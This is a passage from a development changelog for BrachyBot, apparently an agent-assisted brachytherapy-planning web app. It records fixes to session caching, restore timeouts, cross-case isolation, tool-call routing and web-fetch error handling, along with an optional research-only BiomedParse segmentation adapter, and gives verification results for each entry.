cache existed — every restore was a full network round-trip.

### Resolution

1. **New module `brachybot-session-cache.js`** — lightweight IndexedDB
   wrapper with an 800 MB global LRU cap.  Keys are scoped by
   `[sessionId, namespace, key]`.  Entries are purged oldest-first when
   the total exceeds the cap.

2. **CT volume caching** (`loadVolumeData`) — the raw Int16Array binary
   is stored under `{sid}/ct/volume` with a binary header (shape +
   spacing).  On a cache hit the volume is reconstructed from the stored
   ArrayBuffer without a fetch.

3. **3D mesh caching** (`_fetchAndAddOrganMesh`) — the `POST /viewer/3d_mask`
   JSON response (vertices + faces) is stored under
   `{sid}/mesh/{labelId}:{source}:{smoothing}`.  A cache hit skips the
   fetch and passes the parsed JSON directly to `addMeshToScene`.

4. **Cache invalidation** — a new CT upload (`loadCTToViewers` without
   `skipReset`) invalidates all entries for that session.  Logout /
   clear-data calls `SessionCache.invalidateAll()`.

### Verification

- Node syntax check passed for `brachybot-session-cache.js`,
  `brachybot-viewer-volume.js`, and `brachybot-3d-manual.js`.
- Verified the IndexedDB schema creates the object store on first open.
- Cache hit/miss paths are verified via code review — cache hit
  reconstructs volume/mesh without network I/O.

---

## 2026-07-25 — Session delete responsiveness and new-chat spinner hang

### Confirmed issue

1. Clicking the delete button on the currently-active session produced
   no reaction when another transition was in progress — the
   `runWorkspaceTransition` guard silently rejected the delete.

2. Creating a new session (New Chat) could leave the "Opening case…"
   spinner visible for minutes.  When the server request failed, the
   bounce-back `paintSessionShell(previousSessionId)` triggered a full
   background restore of the previous session's clinical data.

3. The `persistWorkspace` call before switching sessions was awaited,
   blocking the visible switch while uploading potentially large report
   figures (base64 data URLs).

### Resolution

1. Both active and inactive session delete paths now use the same
   optimistic flow: remove from the session list immediately, render
   the sidebar, switch to a remaining session if the deleted one was
   active, and send the DELETE request in the background.

2. New-chat failure bounce-back no longer calls `paintSessionShell`.
   Instead it only restores `activeSessionId`, re-renders the sidebar,
   loads the previous chat, and hides the spinner.

3. `POST /api/sessions` (create) timeout reduced from 15 s to 5 s.
   The server endpoint is a simple DB insert + empty snapshot read.

### Verification

- `py_compile` passed for `session_routes.py`.
- Node syntax check passed for `brachybot-workspace.js`.

---

## 2026-07-25 — Workspace state save no longer hydrates the agent

### Confirmed issue

`save_workspace_state` (`/api/workspace/state`) called
`(get_cached_agent or get_agent)(session_id)`, which fell back to full
agent hydration when the agent was not cached.  For a just-completed
planning session this loaded 100+ MB of numpy arrays and a CT image
from disk, blocking the request thread and starving concurrent
requests (e.g. a session-create call).

### Resolution

Changed to `if callable(get_cached_agent): agent = get_cached_agent(session_id)`.
The snapshot is already durable; the in-memory UI-state update is a
best-effort bonus that must never trigger a cold agent creation.

### Verification

- `py_compile` passed for `session_routes.py`.

---

## 2026-07-25 — Session-switch loading: 5-minute hangs and IndexedDB cache performance

### Confirmed issue

1. Switching to a previously visited session and waiting for data
   to load could hang for 5+ minutes.  The root cause was that
   `loadVolumeData`, `loadLabelVolumes`, `refreshPlanningUI`,
   `_restoreActiveSessionWorkspace` (status, snapshot, ui/state
   fetches) all used raw `fetch()` without any timeout.  A hung
   or slow server left the promise pending forever.

2. The IndexedDB cache rewrote the entire `_runningSize` estimate
   plus a debounced 5 s eviction timer instead of the original
   O(n) `getTotalSize()` scan on every `put()`.

### Resolution

1. Added `AbortController` + `setTimeout` guards to every network
   fetch in the restore pipeline:
   - CT volume, label volume: 30 s
   - `/planning/results`: 30 s
   - `/status`: 30 s
   - `/workspace/snapshot`: 15 s
   - `/ui/state`: 10 s

2. Rewrote `brachybot-session-cache.js`:
   - `_runningSize` counter updated on `put()` and `invalidateSession()`.
   - Eviction is now a 5 s debounced timer, not inline on every write.
   - `get()` races against a 2 s timeout — slow IndexedDB returns `null`
     and restore falls through to the network fetch.

3. Also fixed `oarSource` variable scope — it was declared with `const`
   inside the fetch-only block and was `undefined` on cache hit,
   causing `ReferenceError` during organ name restoration.

### Verification

- JS brace counts verified for all 8 modified script files.
- `py_compile` passed for all 7 modified Python files.

---

## 2026-07-25 — Tool auto-execution: regex whitelist replaced with router LLM gating

### Confirmed issue

Messages like "不要动手，只是查看分割完成了没有" triggered
`Direct: oar_segmentation` because `_detect_tool_request` matched
the keyword `"分割"` with zero awareness of negation, questions,
or status-inquiry semantics.  A growing regex whitelist of
negation phrases was proposed but this still couldn't understand
whether the user was asking a question or giving a command.

### Resolution

Instead of adding more regex rules, the fix gates
`_detect_tool_request` on the existing `classify_local_turn`
result: auto-execution only runs when `local_policy.intent` is
`"segmentation"`, `"planning"`, or `"treatment_plan"`.  For
`"knowledge_query"`, `"small_talk"`, and everything else the
message routes through the Multi-Agent Router LLM.

- `chat_workflows.py:841`: guard added
- `llm_runtime.py:347`: removed `_detect_tool_request` entirely
- `turn_policy.py`: added `_is_interrogative()` which classifies
  questions (吗/呢/?, 是不是/有没有/怎么样, English wh-words,
  negation + inspection) as `"knowledge_query"` before keyword
  matching runs.

### Verification

- `py_compile` passed for `response_tools.py`, `turn_policy.py`,
  `chat_workflows.py`, `llm_runtime.py`.

---

## 2026-07-25 — Execution Trace duplicates and chain collapse on task resume

### Confirmed issue

Switching away during a running task and returning produced two
Execution Traces — the older one (from `loadSessionChat`'s
`renderThinkingChain`) and the newer live replay.  The old
cleanup only removed chains with id `"liveThinkingChain"`;
chains created by `renderThinkingChain` have no id and were
missed.

### Resolution

`createLiveThinkingChain` now also removes any `.thinking-chain`
elements that have no `id` attribute — these are the chains
rendered by `renderThinkingChain` during session restore.

### Verification

- JS braces balanced in `brachybot-chat-core.js`.

---

## 2026-07-25 — Session delete and new-chat creation reliability

### Confirmed issue

1. Clicking delete on the active session silently did nothing when
   a workspace transition was already in progress — the
   `runWorkspaceTransition` guard rejected the delete.

2. Creating a new session left the "Opening case…" spinner visible
   when the server request failed — the bounce-back
   `paintSessionShell(previousSessionId)` triggered a full
   background restore of the previous session's clinical data.

### Resolution

1. Both active and inactive session delete paths now use optimistic
   deletion: remove from list immediately, switch to a remaining
   session if needed, send the DELETE request in the background.

2. New-chat failure bounce-back only reverts `activeSessionId`,
   re-renders the sidebar, loads the previous chat, and hides
   the spinner.

### Verification

- JS braces balanced in `brachybot-workspace.js`.

---

## 2026-07-25 — Label volume and report figure IndexedDB caching (Phase 4+5)

### Confirmed issue

1. `/viewer/label_volume` was re-downloaded on every session switch
   even though the segmentation masks are immutable for a given CT.

2. `reportState()` serialised the entire `reportForm.figures` array
   (200 KB – 1 MB of base64 data URLs) into every `persistWorkspace`
   payload, bloating the workspace JSON and wasting upload bandwidth.

### Resolution

1. `loadLabelVolumes` now checks IndexedDB under
   `{sid}/labels/volume` before fetching.  The binary header stores
   shape, color LUT, organ metadata, and CTV label map alongside
   the raw Uint8Array body.  Cache hit restores all headers +
   binary without a network fetch.

2. `reportState()` extracts each figure's `dataUrl` into IndexedDB
   under `{sid}/report/{cacheKey}`, replacing it with an empty string
   and a `_cacheKey` placeholder in the persisted JSON.
   `applyWorkspaceSnapshot` fetches the blobs from cache and
   rebuilds the `dataUrl` on restore.

### Verification

- JS braces balanced in `brachybot-viewer-volume.js` and
  `brachybot-workspace.js`.

---

## 2026-07-25 — CT volume and 3D mesh IndexedDB caching (Phase 1-3)

### Confirmed issue

The entire CT volume (50–100 MB Int16Array) and 3D mesh geometry
(5–15 MB JSON total) were re-downloaded from the server on every
session switch.  No client-side cache existed.

### Resolution

1. Created `brachybot-session-cache.js`: lightweight IndexedDB
   wrapper with an 800 MB LRU cap and per-session key scoping.

2. `loadVolumeData` stores CT binary under `{sid}/ct/volume` with
   a 4-byte length prefix + JSON header (shape, spacing).

3. `_fetchAndAddOrganMesh` stores mesh JSON under
   `{sid}/mesh/{labelId}:{source}:{smoothing}`.

4. Cache invalidation on explicit CT upload (`loadCTToViewers`
   without `skipReset`) and on logout / clear-data.

### Verification

- JS braces balanced in all modified files.
- IndexedDB schema creates the object store on first open.

---

## 2026-07-25 — Session auto-rename overwriting manual rename

### Confirmed issue

1. New session created → user manually renames via pencil icon → sends
   first chat message → `saveSessionMessage()` unconditionally overwrites
   the title with the first 40 characters of the message text.

### Resolution

1. `startRenameSession()` (`brachybot-chat-core.js:366`) now sets
   `session._titleManuallySet = true` after a successful manual rename.

2. `saveSessionMessage()` (`brachybot-chat-core.js:500`) now checks
   `!session._titleManuallySet` before auto-renaming from the first
   user message.

### Verification

- JS braces balanced in `brachybot-chat-core.js`.

---

## 2026-07-25 — Cross-session seed/needle contamination on session switch

### Confirmed issue

After completing a planning pipeline in session A, switching to
session B showed session A's needles and seeds being rendered one
by one onto session B's 2D viewer slices.

### Resolution

`resetAllState()` and `clearClientWorkspace()` (`brachybot-ui-api.js`)
now both set `state.seedsOverlay = null` alongside the existing
`state.seeds = []` and `state.trajectories = []` resets. Previously
`state.seedsOverlay` was never cleared, so the 2D viewer's
`renderSeedsOverlay()` check (`if (state.seedsOverlay)`) passed
with stale data after a session switch.

### Verification

- JS braces verified in `brachybot-ui-api.js`.

---

## 2026-07-25 — label_volume O(n·k) performance with per-label np.sum

### Confirmed issue

After the `organ_counts = None` guard was added, `organ_counts`
fell back to `{}`. The fallback at `viewer_routes.py:549` used
`np.sum(oar_array == lid)` for each of TotalSegmentator's 58
unique labels. Each call created a full-size boolean array
(8M voxels), piling up ~450 MB of temporary allocations across
all labels.

### Resolution

Replaced the per-label `np.sum(oar_array == lid)` pattern with
a single `np.bincount(np.ravel(oar_array))` call that computes
all label voxel counts in one array pass (O(n) regardless of
label count). Results are cached in `_computed_counts` dict and
consulted by the organ_meta loop when `organ_counts` is empty.

### Verification

- `py_compile` passed for `viewer_routes.py`.

---

## 2026-07-25 — SSE handler missing planning_pipeline sub-step detection

### Confirmed issue

The SSE step handler at `chat-todo.js:1735` only checked
`data.tool` against `FINAL_PLANNING_TOOLS` (`['planning_pipeline',
'dose_evaluation']`). However, the planning_pipeline's sub-steps
emit events with `data.tool = "dose_eval"` and
`data.parent_tool = "planning_pipeline"`. The top-level
`data.tool = "planning_pipeline"` event was never emitted,
so `_scheduleCasePlanningRefresh` never fired during the
pipeline. The only fallback was the stream-close handler
at line 1848 which had a 500 ms delay.

### Resolution

Extended the planning-done check to also match on:
- `data.parent_tool` in `FINAL_PLANNING_TOOLS`
- `data.tool` in added `LAST_PLANNING_SUBSTEPS`
  (`['dose_eval', 'dose_calc']`)

The debounce guard in `_scheduleCasePlanningRefresh` already
prevents duplicate scheduling; the first matching sub-step
fires a 300 ms timer (reduced from 250 ms) so `refreshPlanningUI`
runs with data ready shortly after the final sub-step completes.

### Verification

- JS braces balanced in `brachybot-chat-todo.js`.

---

## 2026-07-25 — Viewer DOM controls desync on workspace restore

### Confirmed issue

After session switch / page reload, the viewer controls
(`displayMode` select, `overlayCTV` / `overlayOAR` checkboxes,
`doseOverlayOpacity` slider, `viewerThreshold` input) could
desync from `state.viewerSettings`. The cause was twofold:

1. `applyControls()` sets DOM values from the saved snapshot,
   but `onchange` handlers (e.g. `toggleOverlay()`) firing during
   DOM mutation would write stale values back into
   `state.viewerSettings`.
2. No explicit sync step locked DOM elements back to the final
   restored `state.viewerSettings` after `renderDataTree()`.

### Resolution

Added `_syncViewerControlsFromState()` (`brachybot-workspace.js`)
called immediately after `renderDataTree()` inside
`applyWorkspaceSnapshot()`. This function reads the authoritative
`state.viewerSettings` and sets:
- `displayMode` select value
- `overlayCTV` / `overlayOAR` checkbox checked state
- `viewerThreshold` input value
- `doseOverlayOpacity` slider + label
- `overlaySeeds` checkbox checked state

### Verification

- JS braces balanced in `brachybot-workspace.js` (1235/1235).

---

## 2026-07-25 — Browser-side data leak on session delete

### Confirmed issue

1. Deleting a session via the workspace bridge did NOT invalidate
   its IndexedDB `SessionCache` entries. CT volumes, label volumes,
   3D meshes, and report figures for the deleted session remained
   in the browser cache until the 800 MB LRU cap forced eviction.

2. Legacy `localStorage` entries (`brachybot_manual_state`,
   `brachyplan_reportForm`, `brachyplan_report_audit`,
   `brachyplan_report_snapshots`) were only cleaned by the legacy
   `deleteSession()` in `chat-core.js`, never in the server-backed
   `window.deleteSession()` in `workspace.js`.

### Resolution

1. `window.deleteSession()` (`brachybot-workspace.js`) now calls
   `window.SessionCache.invalidateSession(id)` to remove cached
   CT/label/mesh/report data from IndexedDB immediately on delete.

2. Also calls `removeSessionScopedLocalState(id)` to scrub
   session-scoped localStorage keys that were previously only
   cleaned in the legacy fallback path.

### Verification

- JS braces balanced in `brachybot-workspace.js`.

---

## 2026-07-25 — Pre-existing SyntaxError in planning_routes.py chat task start

### Confirmed issue

Two bugs in `web/routes/planning_routes.py`:

1. **`checkpoint_ui_bridge`**: `WorkspaceNotFound` (raised when a
   deleted session's UI state is persisted by a stale frontend)
   fell through to the generic `WorkspaceError` catch, which logged
   a noisy `WARNING` with full traceback on every retry.

2. **`chat_task_start`**: The outer `try:` at line 2671 had no
   matching `except` or `finally` block. The inner `try/except/
   finally` at 16 spaces was complete, but the outer `try:` at 12
   spaces was never closed, causing `SyntaxError: expected 'except'
   or 'finally' block` at the following `def generate_task()`.

### Resolution

1. Added `import WorkspaceNotFound` and a specific `except
   WorkspaceNotFound` handler above the generic `WorkspaceError`
   catch. Deleted-session persistence attempts are now silently
   dropped.

2. Added `except Exception: start_gate.set()` for the outer try
   around `checkpoint_operation()`. If the workspace checkpoint
   write fails (e.g. workspace was deleted between task creation
   and persistence), the start gate is still released so the SSE
   stream can proceed.

### Verification

- `py_compile` passed for `planning_routes.py`.

---

## 2026-07-26 - Durable workspace performance and cross-session isolation audit

### Scope

This review rechecked the eight symptoms reported for the account-owned
workspace implementation, including session transition latency, reviewer
latency, viewer leakage, CT/label geometry, missing Data Tree children,
viewer-state persistence, browser cache cleanup, and server-side delete races.
The checks were performed against the current code rather than accepting the
original diagnosis without verification.

### Confirmed findings and resolutions

1. **Cold session hydration held a process-wide lock.**
   The original path could keep the sessions lock while reconstructing an
   Agent and reading large CT/NPY sidecars. Hydration is now single-flight per
   `(user_id, session_id)` and runs outside the global cache lock. Unrelated
   cases can continue serving requests while the selected case loads.

2. **IndexedDB writes repeatedly scanned the entire cache.**
   `brachybot-session-cache.js` now stores a running byte total, computes the
   replaced record's old size in the same transaction, and performs at most
   one initialization scan per database lifetime. Put/delete/invalidate paths
   update the total by delta instead of rescanning all records.

3. **Quality and completeness checks performed unnecessary context distillation.**
   Planning review and completeness review now use the already-built agent
   context in the synchronous post-workflow path (`skip_distill=True`). This
   preserves mandatory review while removing the extra reviewer-specific LLM
   context call. The general distillation path remains available for callers
   that do not already have a complete context.

4. **Planning and needle state could cross a case boundary.**
   Client refreshes now carry the expected case ID, clear old seeds/needles
   before installing a new case, and never apply a delayed response to a
   different active case. The server cache is keyed by account and case, and
   the UI bridge is restored per case. Deleted-case client caches and
   session-scoped localStorage are invalidated on deletion.

5. **Mask/CT geometry was not consistently physical-grid based.**
   CT and labels are normalized to LPI using SimpleITK physical metadata and
   nearest-neighbour resampling. Uploaded CTV/OAR paths are reloaded and
   aligned to the current CT grid instead of trusting an old NumPy axis order.
   The label-volume route also has a legacy-array fallback that does not call
   `CopyInformation` on different-sized images. It infers the source extent,
   resamples safely, and applies a final shape guard, removing the confirmed
   intermittent HTTP 500 path.

6. **OAR/Data Tree and Planning refresh could miss pipeline child events.**
   SSE handling now recognizes both `parent_tool=planning_pipeline` and the
   terminal `dose_calc`/`dose_eval` sub-steps. The UI refresh is debounced and
   case-scoped, so OAR children, planning children, dose, DVH, and meshes are
   refreshed after the authoritative pipeline result rather than only after a
   stream-close fallback.

7. **Viewer display state was not authoritative during restore.**
   Snapshot restore now preserves saved viewer settings, then synchronizes
   display mode, CTV/OAR overlays, threshold, dose opacity, seed visibility,
   Data Tree state, and dependent rendering controls from the restored state.
   Restore does not overwrite those values with initialization defaults.

8. **Delete and restart races produced noisy WorkspaceNotFound traces.**
   Deleted cases now quietly discard stale UI-bridge persistence attempts. The
   pre-existing unmatched outer `try` in `planning_routes.py` was repaired, so
   the route module compiles and its task-start gate is released even when a
   workspace disappears during a checkpoint.

9. **Newly found hydration invalidation race.**
   A background hydrate that started before deletion could finish afterwards
   and reinstall the deleted Agent in `_sessions`. A per-case generation fence,
   an active-session recheck, and a lock-protected final generation check now
   discard that stale Agent before it can restore the bridge or register a
   persistence callback. The same fence also prevents a reset from installing
   an obsolete cold-start Agent.

### Verification

- `python -m py_compile web/server.py web/routes/viewer_routes.py` passed.
- `python -m compileall -q AgenticSys.py agent_runtime agents tool_factory web` passed.
- JavaScript syntax checks passed for the modified workspace, chat/SSE, DVH,
  and session-cache modules.
- `git diff --check` passed.
- Full regression suite: **296 passed, 2 skipped, 3 warnings**. This includes
  dedicated regressions for differently sized legacy label arrays and model
  NumPy masks.

The remaining three warnings are third-party SimpleITK SWIG deprecation
warnings and do not indicate a BrachyBot failure. No clinical result is
silently synthesized by these workspace changes; they only govern persistence,
transport, alignment, and presentation state.

---

## 2026-07-26 - Surgical guide entry points and optional BiomedParse v2 CTV adapter

### Surgical guide verification

The patient-specific puncture-guide workflow was already present in the current
baseline and was verified rather than duplicated:

- `surgical_guide` is registered in the agent tool registry and is described in
  the planning prompts.
- The Input panel exposes guide generation, selected needle channels, editable
  millimetre parameters, saved versions, STL export, and STL validation.
- The chat tool accepts `action=generate|status` and uses the same versioned,
  case-scoped geometry contract as the web route.
- CT/needle preconditions, physical-coordinate preservation, watertightness,
  stale-version invalidation, and adjustable manufacturing dimensions remain
  covered by `tests/test_surgical_guide.py`.

This means a user can generate the guide from the button after a plan or ask
the agent explicitly after planning. The agent must report the guide version
and automated QA, and it must not call the guide before CT and planned needle
geometry exist or describe it as clinically approved.

### BiomedParse v2 assessment

The official Microsoft project is a suitable **research candidate** for
non-pancreatic CT lesion candidates because it documents 3D text-guided
inference and CT prompts for liver tumors, kidney lesions, lung lesions, colon
primaries, and head/neck cancer. It is not a site-specific clinically
validated CTV model. The official repository and model card are the source of
truth for installation, checkpoint access, and supported prompts:

- https://github.com/microsoft/BiomedParse/tree/v2
- https://huggingface.co/microsoft/BiomedParse
- https://doi.org/10.1038/s41592-024-02499-w

The adapter in `tool_factory/CTV_seg/biomedparse_v2.py` is intentionally
optional and lazy:

- The existing `nnunet_pancreatic` route remains the only pancreatic automatic
  path; BiomedParse has no pancreatic fallback route in this project.
- For liver, kidney, lung, and colon, the existing local VoCo model is tried
  first. If its checkpoint is absent and an explicitly configured BiomedParse
  checkout/checkpoint exists, the matching research candidate is used.
- Head/neck exposes an explicit BiomedParse candidate because there is no
  current local lesion model in the automatic registry.
- Without the external checkout, its pinned isolated dependencies, or the
  checkpoint, the tool fails closed with actionable metadata. Empty masks also
  fail closed. No checkpoint is downloaded or committed automatically.
- Outputs are normalized to the existing LPI physical-grid contract and retain
  model URL, checkpoint, prompt, existence confidence, `research_only=true`,
  and `clinical_validation_status=not_established` metadata.
- The official torch/Hydra stack is not added to core requirements; setup and
  clinical limitations are documented in
  `docs/BIOMEDPARSE_V2_SETUP.md`.

The normal selector continues to show tumor types rather than implementation
brands. Its availability probe includes the optional catalog so a configured
BiomedParse fallback is shown as actionable while still preserving the
research-only provenance in the server result.

### Verification

- Full regression suite: **301 passed, 2 skipped, 3 warnings**.
- Targeted BiomedParse, surgical-guide, and review regressions passed.
- `compileall` passed for `AgenticSys.py`, `agent_runtime`, `agents`,
  `tool_factory`, and `web`.
- All JavaScript files passed `node --check`.
- `git diff --check` passed.

The three warnings remain third-party SimpleITK SWIG deprecations. No local
checkpoint is included, so real BiomedParse inference still requires an
explicitly provisioned upstream runtime and separate clinical validation.

## 2026-07-27 - Session restore performance and non-blocking hydration

### Confirmed bottlenecks

The session restore path had two real, independent latency sources:

1. The browser cache started a full IndexedDB entry scan and awaited it from
   the first `get`, `put`, and session invalidation. The scan was intended for
   quota accounting, but it was on the clinical restore critical path.
2. When a background restore did not receive an already-loaded workspace
   snapshot, the browser called the full `/api/status` endpoint. That endpoint
   creates/hydrates the selected Agent and can read CT and planning artifacts;
   it is appropriate for a complete status view, not for switching the visible
   case shell.
3. Report figure cache entries were read serially while applying the snapshot,
   so a report with several large screenshots could delay the first paint.

### Implemented fixes

- IndexedDB size accounting now starts its one-time baseline scan in the
  background. Normal cache reads and writes return on the IndexedDB operation;
  pending size deltas are reconciled when the baseline completes. Full entry
  enumeration remains reserved for deferred quota eviction.
- Added `/api/status?lightweight=1`. It reads only the authenticated durable
  snapshot, returns case-owned input paths, artifact keys, runtime checkpoint
  metadata, and revision information, and deliberately does not call
  `get_agent()`.
- Background restore derives the same lightweight status directly from the
  already-fetched workspace snapshot whenever possible. The full status
  endpoint remains unchanged for callers that need device/provider health and
  live Agent status.
- Report figures are restored with concurrent cache reads after the control
  plane has painted. A session/generation fence prevents late figure data from
  changing another case.
- The existing generation fences remain in force for CT, labels, dose, meshes,
  DVH, report assets, and task replay. Switching cases changes the visible
  shell immediately; resource hydration continues in a case-scoped background
  task and does not cancel the server-owned task.
- Empty-case creation uses a separate blank-shell path. It cancels only the
  browser's previous hydration callbacks, clears the old visible workspace,
  suppresses the misleading `Opening case...` notice, and skips clinical
  resource restoration because a new case has no resources yet. This does not
  abort or mutate the previous case's server-owned task.

### Verification

- `node --check` passed for the session cache, workspace bridge, and UI API.
- `python -m py_compile web/routes/planning_routes.py` passed.
- `git diff --check` passed.
- Full regression suite: **302 passed, 2 skipped, 3 warnings**.
- Frontend workspace regressions: **54 passed**.

The three warnings remain third-party SimpleITK SWIG deprecation warnings.
This optimization changes scheduling and status transport only; it does not
change coordinate conversion, dose calculation, planning candidate selection,
or clinical review logic.

## 2026-07-27 - Durable case product restore and background hydration completion

### Confirmed symptoms

- The fast session shell could repaint chat while the latest full workspace
  snapshot was still behind the terminal checkpoint of a completed task.
- CT, labels, and planning results were not restored in a dependency-safe
  order. Starting label/planning requests before CT hydration could leave the
  OAR Data Tree or Planning branch empty even though the 2D viewer had data.
- A detached task could publish its terminal chat state before its planning
  arrays and surgical-guide metadata had been synchronously persisted.
- Historical snapshots containing only `chat.execution_trace` could reopen
  without a visible transcript.
- The Figure 1 right close-up could let translucent CTV geometry occlude needle
  paths, and the temporary capture pass did not restore every child material
  and render-order property.
- Empty surgical-guide calls were rejected even though the only meaningful
  operation was generation.
- A restore failure could leave the corner loading indicator active forever.
- Hiding the Planning Data Tree parent hid 3D children but left the independent
  2D dose projection canvas painted on the current slice.

### Implemented fixes

- Background restore now fetches an authoritative, session-scoped workspace
  snapshot using `X-BrachyBot-Session` before clinical hydration. The visible
  shell restores chat, timestamps, tool history, report state, task metadata,
  and the execution trace immediately; a fixed bottom-right non-blocking
  spinner indicates that CT, labels, planning, guide meshes, DVH, and report
  assets are still being hydrated.
- Existing cases keep the spinner until the case-scoped restore completes or
  fails; the failure path clears it. New empty sessions skip the misleading
  opening-case loader and immediately clear the previous case presentation.
- CT is awaited as the geometry dependency. CTV/OAR label loading and planning
  result loading then start in parallel; planning skips the duplicate label
  request. A generation/session fence prevents late responses from changing a
  different active case.
- `preserveClinicalData` reapplies only saved presentation properties after
  current-case loaders create the Data Tree entries. It does not overwrite
  current OAR/CTV/planning arrays, coordinate metadata, or geometry with a
  stale browser snapshot.
- Chat finalization synchronously flushes the agent checkpoint before terminal
  `done` publication. The original user timestamp and durable execution trace
  are retained, so reopening a completed or detached task restores the same
  conversation and tool history. A legacy trace-only snapshot gets a safe
  read-only thinking row instead of silently appearing empty.
- Report figures are restored from the session-scoped IndexedDB cache in
  parallel after the control plane paints. Figure 1 temporarily promotes seed
  and needle render order with depth testing disabled for the close-up, then
  restores all captured child materials and render-order values.
- `surgical_guide` treats an omitted or empty action as `generate`, while the
  persisted planning checkpoint retains guide metadata and the guide mesh is
  loaded asynchronously under the active-session fence.
- Planning-parent visibility now updates `dataTreeState.planning.visible`,
  dose-overlay visibility, color bars, and all independent 2D dose/contour
  canvases. Hiding the parent therefore removes dose projections immediately,
  not only the 3D Planning children.

### Deliberate boundaries

- Server-owned tasks survive browser/session switches; only an explicit Stop
  action cancels a task. Switching sessions only detaches the current browser
  stream and never cancels the task.
- On server restart, a running task is marked interrupted rather than being
  presented as completed. The last reliable checkpoint remains available for
  explicit resume.
- Clinical arrays and meshes are not trusted from browser JSON. They are
  rehydrated through authenticated, case-owned server endpoints using the
  saved workspace artifacts, preserving the existing coordinate chain.

### Verification

- Targeted workspace, surgical-guide, and restore regressions: **69 passed, 3
  warnings**.
- Full regression suite: **310 passed, 2 skipped, 3 warnings**.
- `compileall` passed for `AgenticSys.py`, `agent_runtime`, `agents`,
  `tool_factory`, and `web`.
- All JavaScript files passed `node --check`.
- `git diff --check` passed.

The three warnings remain third-party SimpleITK SWIG deprecation warnings. The
changes above affect restore scheduling, durable presentation, report capture,
and visibility synchronization; they do not change coordinate conversion,
dose calculation, candidate-path selection, or clinical review thresholds.

## 2026-07-27 - Cold-session chat handshake and restart recovery

### Confirmed root cause

The supplied restart log shows two separate cold-case hydration paths: the
server constructs a `BrachyAgent`, reads the case CT, and initializes the
nnU-Net/device state before the request can continue. That work is expected to
be expensive for a case with CT/NPY/model artifacts, but it was incorrectly
performed synchronously by `get_agent()` on the `/api/chat` request. The browser
chat client has a finite connection timeout, so it later reported
`Send failed: signal is aborted without reason`. This was a request-handshake
timeout, not evidence that the LLM had entered a loop. The log also shows that
the CT loader correctly reoriented the volume to LPI; this patch does not alter
that coordinate-chain behavior.

### Implemented fixes

- Added a case-owned lazy Agent supplier to `ChatTaskManager`. Streaming chat
  now returns its SSE/task identity immediately, then publishes a visible
  `Loading case resources` pending step while the worker hydrates the Agent.
  The worker checks cancellation before and after hydration and never reports a
  successful answer when hydration fails.
- Added an owner-explicit `get_agent_for_owner()` path for detached workers.
  It validates the authenticated user and case directly instead of depending on
  a browser Flask session cookie.
- Streaming `/api/chat` now uses the cached Agent when available and otherwise
  queues the turn without blocking the HTTP handshake. The existing synchronous
  path is retained for non-stream callers.
- `/api/chat/abort` now cancels a cold task without first hydrating the case, so
  the Stop button remains responsive during CT/model restoration.
- Browser initialization now requests `/api/status?lightweight=1`, paints the
  durable chat/control-plane snapshot first, and starts clinical restoration in
  background mode. CT loading has a bounded client timeout; slow mesh loading
  is detached from the interactive shell and remains session-generation fenced.
- Added a regression test proving that a task with a cold Agent reaches the
  worker supplier and completes without making the task-start handshake wait.

### Verification

- `python -m py_compile web/server.py web/routes/planning_routes.py web/chat_tasks.py`
- `node --check web/app/static/js/brachybot-ui-api.js`
- `node --check web/app/static/js/brachybot-dvh-planning.js`
- `git diff --check`
- Targeted regression suite: **70 passed, 3 warnings**

The warnings remain third-party SimpleITK SWIG deprecation warnings. The
change affects request scheduling and restart UX only; it does not change the
planning algorithm, dose model, coordinate conversion, or clinical review
thresholds. A cold first chat can still take time while the case Agent and
models are being restored, but the user now sees that work as an explicit
pending step and can cancel it without waiting for the HTTP connection to
expire.

## 2026-07-27 - Non-fatal web source failures and evidence-preserving fallback

### Confirmed symptoms

- A blocked page such as a Zhihu article could make `web_fetch` return a
  `ToolResult` with only `message` populated. The generic formatter read only
  `error`, so the Execution Trace displayed `Error: None`.
- When the model returned an empty response or repeated the transport
  placeholder after a mixed web turn, the fallback inspected only legacy
  message shapes. It missed current `role=tool` messages, so a successful
  `web_search` could be discarded together with one failed `web_fetch` and
  the user received `Tools executed. Check the execution trace above for
  results.` instead of an answer.
- The synthesis prompt treated any one web-tool error as a complete search
  failure, even when another web tool had produced usable evidence.

### Implemented fixes

- `WebFetchTool` now writes the same human-readable reason to both the legacy
  `message` field and the structured `error` field, including validation,
  timeout, and request-exception paths. This preserves compatibility while
  making the failure visible and actionable.
- LLM runtime error formatting falls back from `error` to `message`, and the
  fallback collector reads both current `role=tool` messages and historical
  `[Tool result: ...]` messages. Successful evidence is retained separately
  from source-failure notes.
- Transport placeholders are treated as empty model output. If at least one
  search/fetch result succeeded, the available evidence is returned and the
  failed source is not allowed to erase it. If every source failed, the user
  receives a concise retry explanation instead of an opaque trace-only
  response.
- `ToolResultPipeline` now escalates the full failure reason only when all web
  sources failed. A single blocked URL therefore does not force the final
  answer into the global web-failure warning path.
- Malformed `ui_screenshot` calls remain rejected before execution; this is
  independent of web-source failures and prevents a missing-target error from
  creating another retry cascade.

### Verification

- `py_compile` passed for the modified runtime, core formatter, response tools,
  and web fetch tool.
- Targeted regression suite: **97 passed, 3 warnings**.
- `git diff --check` passed. The warnings are the existing SimpleITK SWIG
  deprecation warnings.

These changes affect source retrieval error handling and response fallback
selection only. They do not weaken URL validation, source verification, tool
authorization, clinical planning, dose calculation, or coordinate conversion.

## 2026-07-27 - Non-blocking workspace checkpoint and live-progress recovery

### Confirmed root causes

- The successful chat path treated `workspace_checkpoint` as part of the user-visible
  task. `finalize_chat_task()` synchronously serialized the Agent memory before
  sending the terminal SSE event. CT-sized arrays, nested CTV/OAR masks, dose data,
  snapshot JSON, sidecar cleanup, and SQLite metadata therefore appeared as a frozen
  final step. A slow or interrupted write could leave the UI at `11/12` while no
  clinical operation was still running.
- A process restart could not reliably reuse nested arrays stored below OAR/CTV
  structure names. Each checkpoint could rewrite unchanged NPY sidecars, and the
  previous quota implementation rescanned the whole account for every array.
- Long model/tool phases can legitimately produce no business SSE event. Without a
  protocol heartbeat, the browser read timeout could emit
  `Connection interrupted; restoring live progress...` even though the server task
  was still alive.
- Empty or newly-created sessions were allowed to enter the clinical restore wrapper.
  This caused a misleading `Loading case resources...` notice and could leave a stale
  restore timer attached after a case was deleted or switched.

### Implemented fixes

- Chat completion now commits the lightweight transcript, execution trace, and
  operation status first, emits the final response, and starts the heavy Agent
  checkpoint in a daemon worker. The checkpoint is no longer added to the main
  Execution Trace. Its independent status is exposed as task metadata for diagnostics;
  a slow or failed save cannot turn a completed clinical response into a pending UI
  step.
- Planning, surgical-guide, and request-completion checkpoints use a debounced
